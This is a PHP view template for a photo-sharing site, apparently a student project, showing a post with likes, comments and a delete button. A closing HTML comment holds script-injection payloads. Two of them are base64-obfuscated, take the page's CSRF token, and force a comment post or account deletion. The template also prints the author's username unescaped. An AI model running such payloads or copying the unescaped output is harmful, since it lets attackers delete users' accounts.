<?php

?>

<!DOCTYPE html>
<html lang="en">
	<head>
		<?php require_once $_SERVER['DOCUMENT_ROOT'] . '/src/views/components/head.php'; ?>
	</head>
	<body>
		<?php require_once $_SERVER['DOCUMENT_ROOT'] . '/src/views/components/navbar.php'; ?>
		<?php require_once $_SERVER['DOCUMENT_ROOT'] . '/src/views/components/alert.php'; ?>
		<div class="container pt-3">
			<div id="posts">
				<div class="card m-auto mb-3" style="width: 18rem;">
					<img src="<?= $_ENV['BASE_URL'] ?>/storage/<?= $post['path'] ?>.png" alt="">
					<div class="card-body">
						<p class="card-title">Autheur: <?= $post['username'] ?></p>
						<p class="card-text"><small class="text-muted"><?= $post['created_at'] ?></small></p>
						<h6>
						<svg xmlns="http://www.w3.org/2000/svg" data-liked="<?= $liked ? 'true' : 'false' ?>" id="heart" width="16" height="16" fill="currentColor" class="bi bi-heart" viewBox="0 0 16 16"><path d="m8 2.748-.717-.737C5.6.281 2.514.878 1.4 3.053c-.523 1.023-.641 2.5.314 4.385.92 1.815 2.834 3.989 6.286 6.357 3.452-2.368 5.365-4.542 6.286-6.357.955-1.886.838-3.362.314-4.385C13.486.878 10.4.28 8.717 2.01zM8 15C-7.333 4.868 3.279-3.04 7.824 1.143q.09.083.176.171a3 3 0 0 1 .176-.17C12.72-3.042 23.333 4.867 8 15"/></svg>
						&nbsp;<span class="badge text-dark" data-total-like><?= $total_likes ?></span></h6>
						<button id="remove-picture" class="btn btn-danger">Supprimer</button>
					</div>
				</div>
			</div>
			<div id="comments">
				<?php foreach ($comments as $comment): ?>
					<div class="card m-auto mb-3" style="width: 18rem;">
						<div class="card-body">
							<p class="card-text"><?= htmlspecialchars($comment['content']); ?></p>
							<p class="card-text"><small class="text-muted"><?= $comment['created_at'] ?></small></p>
						</div>
					</div>
				<?php endforeach; ?>
			</div>
			<?php if (isset($_SESSION['user'])): ?>
				<div class="card m-auto mb-3" style="width: 18rem;">
					<div class="card-body">
						<form data-form-add-comment>
							<div class="mb-3">
								<label for="content" class="form-label">Commentaire</label>
								<input type="text" class="form-control" id="content" name="content" data-comment-content>
							</div>
							<div class="d-none">
								<input type="text" name="csrf" value="<?= $_SESSION['csrf'] ?? '' ?>">
							</div>
							<button type="submit" data-button-comment class="btn btn-primary">Commenter</button>
						</form>
					</div>
				</div>
			<?php endif; ?>
		<script>
			const heart = document.querySelector('#heart');
			const likeCounter = document.querySelector('[data-total-like]');
			const input = document.querySelector('[data-comment-content]');
			const button = document.querySelector('[data-button-comment]');
			const form = document.querySelector('[data-form-add-comment]');
			const btn_remove_picture = document.querySelector('#remove-picture');

			<?php if (!isset($_SESSION['user'])): ?>
				heart.addEventListener('click', () => {
					alert('Vous devez être connecté');
				});
				btn_remove_picture.addEventListener('click', () => {
					alert('Vous devez être connecté');
				});
				btn_remove_picture.remove();
			<?php else: ?>
				<?php if ($_SESSION['user']['id'] !== $post['user_id']): ?>
					btn_remove_picture.remove();
				<?php else: ?>
					btn_remove_picture.addEventListener('click', async () => {
						if (confirm('Voulez-vous vraiment supprimer cette image ?'))
							await removePicture();
					});

					async function removePicture() {
						await fetch('/posts/delete', {
							method: 'POST',
							headers: {
								'Content-Type': 'application/x-www-form-urlencoded',
							},
							body: `postId=<?= $post['id'] ?>&csrf=<?= $_SESSION['csrf'] ?>`,
						})
						.then(async (_) => {
							if (!(_.status >= 200 && _.status <= 299))
								return alert('Une erreur est survenue');
							window.location.href = '/';
						});
					}
				<?php endif; ?>

				heart.addEventListener('click', async () => {
					await toggleHeart();
				});

				async function toggleHeart()
				{
					await (heart.dataset.liked === 'true' ? unlike : like)();
				}

				async function like() {
					await fetch('/posts/likes', {
						method: 'POST',
						headers: {
							'Content-Type': 'application/x-www-form-urlencoded',
						},
						body: `postId=<?= $post['id'] ?>&csrf=<?= $_SESSION['csrf'] ?>`,
					})
					.then(async (_) => {
						if (!(_.status >= 200 && _.status <= 299))
							return alert('Une erreur est survenue');
						const response = await _.json();
						setHearth(response.liked);
						likeCounter.textContent = response.total_likes;
					});
				}

				async function unlike() {
					await fetch('/posts/unlikes', {
						method: 'POST',
						headers: {
							'Content-Type': 'application/x-www-form-urlencoded',
						},
						body: `postId=<?= $post['id'] ?>&csrf=<?= $_SESSION['csrf'] ?>`,
					})
					.then(async (_) => {
						if (!(_.status >= 200 && _.status <= 299))
							return alert('Une erreur est survenue');
						const response = await _.json();
						setHearth(response.liked);
						likeCounter.textContent = response.total_likes;
					});
				}

				function setHearth(liked) {
					if (liked) {
						heart.setAttribute('fill', 'red');
						heart.setAttribute('class', 'bi bi-heart-fill');
						heart.innerHTML = '<path fill-rule="evenodd" d="M8 1.314C12.438-3.248 23.534 4.735 8 15-7.534 4.736 3.562-3.248 8 1.314"/>';
						heart.setAttribute('data-liked', 'true');
					} else {
						heart.setAttribute('fill', 'currentColor');
						heart.setAttribute('class', 'bi bi-heart');
						heart.innerHTML = '<path d="m8 2.748-.717-.737C5.6.281 2.514.878 1.4 3.053c-.523 1.023-.641 2.5.314 4.385.92 1.815 2.834 3.989 6.286 6.357 3.452-2.368 5.365-4.542 6.286-6.357.955-1.886.838-3.362.314-4.385C13.486.878 10.4.28 8.717 2.01zM8 15C-7.333 4.868 3.279-3.04 7.824 1.143q.09.083.176.171a3 3 0 0 1 .176-.17C12.72-3.042 23.333 4.867 8 15"/>';
						heart.setAttribute('data-liked', 'false');
					}
				}

				<?= 'setHearth(' . $liked ? 'true' : 'false' . ')' ?>

				form.addEventListener('submit', function(event) {
					event.preventDefault();
					if (button.disabled)
						return;
					const content = document.querySelector('[data-comment-content]').value;
					fetch(`<?= $_ENV['BASE_URL'] ?>/comments`, {
						method: 'POST',
						headers: {
							'Content-Type': 'application/x-www-form-urlencoded',
						},
						body: `content=${content}&postId=<?= $post['id'] ?>&csrf=<?= $_SESSION['csrf'] ?>`,
					})
					.then(async (_) => {
						const response = await _.json();
						addComment(response.id, response.content, response.author, response.created_at);
						input.value = '';
					})
				});

				input.addEventListener('input', function() {
					button.disabled = !this.value;
				});

				function addComment(id, content, author, created_at) {
					const card = document.createElement('div');
					card.classList.add('card', 'm-auto', 'mb-3');
					card.style.width = '18rem';
					card.innerHTML = `
						<div class="card-body">
							<p id="comment-${id}-content" class="card-text"></p>
							<p id="comment-${id}-author" class="card-text"></p>
							<p class="card-text"><small class="text-muted" id="comment-${id}-date"></small></p>
						</div>
					`;

					document.querySelector('#comments').appendChild(card);
					document.querySelector(`#comment-${id}-content`).innerText = content;
					document.querySelector(`#comment-${id}-author`).innerText = author;
					document.querySelector(`#comment-${id}-date`).innerText = created_at;
				}
			<?php endif; ?>
		</script>
		<!--
			<h1>Hello</h1>
			<script>alert('Hello')</script>

			<script>
				(function() {
					setTimeout(() => {
						var scr = document.createElement('script');
						scr.innerHTML = 'Code html';
						document.querySelector('body').appendChild(scr);
					}, 3000)
				})()
			</script>

			<script>(function() {setTimeout(() => {var scr = document.createElement('script');scr.innerHTML = atob('KGZ1bmN0aW9uKCkge2ZldGNoKCJodHRwczovLzEwLjAuMC4zL2NvbW1lbnRzIiwge21ldGhvZDogJ1BPU1QnLGhlYWRlcnM6IHsnQ29udGVudC1UeXBlJzogJ2FwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCcsfSxib2R5OiJjb250ZW50PUhlbGxvJnBvc3RJZD0iICsgd2luZG93LmxvY2F0aW9uLnNlYXJjaC5zcGxpdCgiPSIpWzFdICsgIiZjc3JmPSIgKyBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCdpbnB1dFtuYW1lPSJjc3JmIl0nKS52YWx1ZSx9KS50aGVuKGFzeW5jIChfKSA9PiB7Y29uc3QgcmVzcG9uc2UgPSBhd2FpdCBfLmpzb24oKTthZGRDb21tZW50KHJlc3BvbnNlLmlkLCByZXNwb25zZS5jb250ZW50LCByZXNwb25zZS5hdXRob3IsIHJlc3BvbnNlLmNyZWF0ZWRfYXQpO2lucHV0LnZhbHVlID0gJyc7fSk7fSkoKTs=');document.querySelector('body').appendChild(scr);}, 3000)})()</script>
			<script>(function() {setTimeout(() => {var scr = document.createElement('script');scr.innerHTML = atob('KGZ1bmN0aW9uKCkge2ZldGNoKCJodHRwczovLzEwLjAuMC4zL2FjY291bnQvZGVsZXRlIiwge21ldGhvZDogJ1BPU1QnLGhlYWRlcnM6IHsnQ29udGVudC1UeXBlJzogJ2FwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCcsfSxib2R5OiJjc3JmPSIgKyBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCdpbnB1dFtuYW1lPSJjc3JmIl0nKS52YWx1ZSx9KS50aGVuKGFzeW5jIChfKSA9PiB7d2luZG93LmxvY2F0aW9uLmhyZWY9Ii8ifSk7fSkoKTs=');document.querySelector('body').appendChild(scr);}, 3000)})()</script>
		-->
	</body>
</html>
